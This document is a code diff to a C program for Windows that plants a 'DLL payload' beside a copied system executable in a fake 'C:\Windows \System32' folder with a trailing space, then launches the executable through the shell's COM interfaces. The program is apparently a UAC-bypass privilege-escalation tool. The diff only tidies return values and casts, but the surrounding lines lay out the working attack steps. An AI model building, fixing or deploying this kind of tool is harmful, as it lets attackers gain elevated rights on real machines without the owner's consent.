@@ -7,6 +7,7 @@
 #include <shlwapi.h>
 #include <combaseapi.h>
 #include <heapapi.h>
+#include <stdio.h>
 
 int main(int argc, char* argv[])
 {
@@ -41,12 +42,12 @@ int main(int argc, char* argv[])
     if(!PathFileExists((LPCTSTR)originalLocation)){
         printf("The target executable does not exist in \"C:\\Windows\\System32\".\n");
         goto FileCleanup;
-        return;
+        return 1;
     }
 
     // Create "C:\Windows \System32" directory
-    CreateDirectoryW((LPCTSTR)L"\\\\?\\C:\\Windows \\", 0);
-    CreateDirectoryW((LPCTSTR)L"\\\\?\\C:\\Windows \\System32\\", 0);
+    CreateDirectoryW((LPCWSTR)L"\\\\?\\C:\\Windows \\", 0);
+    CreateDirectoryW((LPCWSTR)L"\\\\?\\C:\\Windows \\System32\\", 0);
 
     // Copy the DLL payload and target executable to "C:\Windows \System32"
     printf("Copying file from \"%s\" to \"%s\".\n", originalLocation, newLocation);
@@ -59,7 +60,7 @@ int main(int argc, char* argv[])
             printf("Error %d: Could not copy the executable to the destination.\n", GetLastError());
         }   
         goto FileCleanup;
-        return;
+        return 1;
     }else{
         printf("Executable copied successfully.\n");
     }
@@ -67,7 +68,7 @@ int main(int argc, char* argv[])
     if(GetLastError()!=0){
         printf("Error %d: Could not copy the DLL payload to the destination.\n", GetLastError());
         goto FileCleanup;
-        return;
+        return 1;
     }else{
         printf("DLL payload copied successfully.\n");
     }
@@ -89,7 +90,7 @@ int main(int argc, char* argv[])
     if (!SUCCEEDED(hr)) {
         printf("CoInitialize failed: 0x%08lx", hr);
         goto FileCleanup;
-        return;
+        return 1;
     }
 
     wchar_t* ShellBrowserI = L"{000214E2-0000-0000-C000-000000000046}";
@@ -135,7 +136,7 @@ int main(int argc, char* argv[])
     if(!SUCCEEDED(hr)){
         printf("CoCreateInstanceEx failed: 0x%08lx", hr);
         goto FileCleanup;
-        return;
+        return 1;
     }
 
     hr = mqi->pItf->lpVtbl->QueryInterface(mqi->pItf, &Ipsw, (void**)&psw);
@@ -144,7 +145,7 @@ int main(int argc, char* argv[])
         printf("ShellWindows->QueryInterface failed: 0x%08lx", hr);
         goto Cleanup;
         goto FileCleanup;
-        return;
+        return 1;
     }
 
     hr = mqi->pItf->lpVtbl->Release(mqi->pItf);
@@ -153,7 +154,7 @@ int main(int argc, char* argv[])
         printf("Releaseing IShellWindows failed: 0x%08lx", hr);
         goto Cleanup;
         goto FileCleanup;
-        return;
+        return 1;
     }
 
     hr = psw->lpVtbl->FindWindowSW(psw, &vEmpty, &vEmpty, SWC_DESKTOP, (long*)&hwnd, SWFO_NEEDDISPATCH, &pdisp);
@@ -162,7 +163,7 @@ int main(int argc, char* argv[])
         printf("FindWindowSW failed: 0x%08lx", hr);
         goto Cleanup;
         goto FileCleanup;
-        return;
+        return 1;
     }
 
     hr = pdisp->lpVtbl->QueryInterface(pdisp, &servicerprovider_iid, (void**)&svsProvider);
@@ -170,7 +171,7 @@ int main(int argc, char* argv[])
         printf("pdisp->QueryInterface failed: 0x%08lx", hr);
         goto Cleanup;
         goto FileCleanup;
-        return;
+        return 1;
     }
 
     hr = svsProvider->lpVtbl->QueryService(svsProvider, &ITopLevelSID, &Ipsb, (void**)&psb);
@@ -178,7 +179,7 @@ int main(int argc, char* argv[])
         printf("pdisp->QueryInterface failed: 0x%08lx", hr);
         goto Cleanup;
         goto FileCleanup;
-        return;
+        return 1;
     }
 
     hr = psb->lpVtbl->QueryActiveShellView(psb, &psv);
@@ -186,7 +187,7 @@ int main(int argc, char* argv[])
         printf("psb->QueryActiveShellView failed: 0x%08lx", hr);
         goto Cleanup;
         goto FileCleanup;
-        return;
+        return 1;
     }
 
     hr = psv->lpVtbl->GetItemObject(psv, SVGIO_BACKGROUND, &Ipdisp, (void**)&pdispBackground);
@@ -194,7 +195,7 @@ int main(int argc, char* argv[])
         printf("psv->GetItemObject failed: 0x%08lx", hr);
         goto Cleanup;
         goto FileCleanup;
-        return;
+        return 1;
     }
 
     hr = pdispBackground->lpVtbl->QueryInterface(pdispBackground, &Ipsfvd, (void**)&psfvd);
@@ -202,7 +203,7 @@ int main(int argc, char* argv[])
         printf("pdispBackground->QueryInterface failed: 0x%08lx", hr);
         goto Cleanup;
         goto FileCleanup;
-        return;
+        return 1;
     }
 
     hr = psfvd->lpVtbl->get_Application(psfvd, &pdisp);
@@ -210,7 +211,7 @@ int main(int argc, char* argv[])
         printf("psfvd->get_Application failed: 0x%08lx", hr);
         goto Cleanup;
         goto FileCleanup;
-        return;
+        return 1;
     }
 
     hr = pdisp->lpVtbl->QueryInterface(pdisp, &ISHLDISP, (void**)&psd);
@@ -218,7 +219,7 @@ int main(int argc, char* argv[])
         printf("pdisp->QueryInterface failed: 0x%08lx", hr);
         goto Cleanup;
         goto FileCleanup;
-        return;
+        return 1;
     }
 
     printf("Executing \"%s\"...\n", newLocation);
